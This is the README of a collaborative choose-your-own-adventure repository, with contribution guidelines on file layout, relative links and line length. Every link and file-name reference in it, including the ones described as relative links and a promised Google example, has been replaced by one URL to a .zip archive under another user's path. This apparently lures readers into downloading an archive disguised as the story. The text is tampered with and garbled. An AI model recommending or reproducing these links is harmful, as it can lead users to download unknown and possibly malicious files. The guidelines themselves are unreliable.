# Collaborative Create-Your-Own-Adventure

This is a create-your-own-adventure story where at each step, the reader chooses
what action to take and turns to an appropriate page of the story based on their
choice.  It is collaborative because it is written one small piece at a time by
many authors.  To start reading the story, click [here](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip).

## Format of the Story

Each "page" of this story is a separate file.  The files are Markdown, which
means they are plain text, but with a few special capabilities.  The only
Markdown capability used in this story is links.  By putting text in brackets
and a URL in parentheses, you can add a link to the story.  For example, the
following text would turn "here" into a link to Google:

## Contribution Guidelines

### Make Appropriately Sized Changes

Try to keep your change small.  Part of the fun of a collaborative story is
that no one person writes very much of it!  On the other hand, please **don't**
add an option without adding any story for readers who choose that option, or
the story will soon be full of dead links.  Instead, the last `.md` file the reader
reaches on any path of the story should not have any options.  For an example, see
[this file](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
from an early version of the story.  Here are some examples of  appropriate changes:

* Add a sentence or two to an existing "page" (file) of the story.
* Add a new option to an existing choice point, and link that option to an
  existing "page".
* Add a new option to an existing choice point, create a new "page" for that
  option, and add a sentence or two to the new "page".
* Add a couple of options to a current dead-end "page", and add a "page" or link
  to an existing "page" for each option.


### Directory Structure

We expect that this repository will eventually contain quite a few files, so we
have a unique directory structure that we'd like contributors to follow to help
keep things organized.

Each "page" in the story should have its own directory with a single Markdown file.
The name of the Markdown file should reflect the subject of the file.  For example,
the first "page" is at the top of the repository, and it is named https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip because
in it, the reader selects their language.

When you add a new option to an existing "page", you should add the file for that new
option in a subdirectory of the file that links to it.  For example, when I added the option
to eat the walls on the "page" [https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip), I created
a new directory called [english/eating-walls/](english/eating-walls/), and a new file within
that directory called
[https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip).

### Use Relative Links

The links in this file should be [relative links](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
so that they will still work if the repository is forked.  View the [https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
file for an example of relative links.  (Click the "Raw" button to view the text that creates the
links.)  You can also use `..` to refer to the parent of the current directory if necessary.

### Line Length

Please keep all lines to 120 characters or fewer.  Otherwise, the raw files
will be difficult to read in the browser or on the command line, and changes
will be harder to review.

### Blank Lines Between Options

Insert blank lines between different options so that the options will be
visually separated.

### Avoid Using Markdown Features

Other than links, please only use plain text in your story and not the other
features of Markdown.  We want it to be easy to read the raw files even for
people who don't know Markdown.
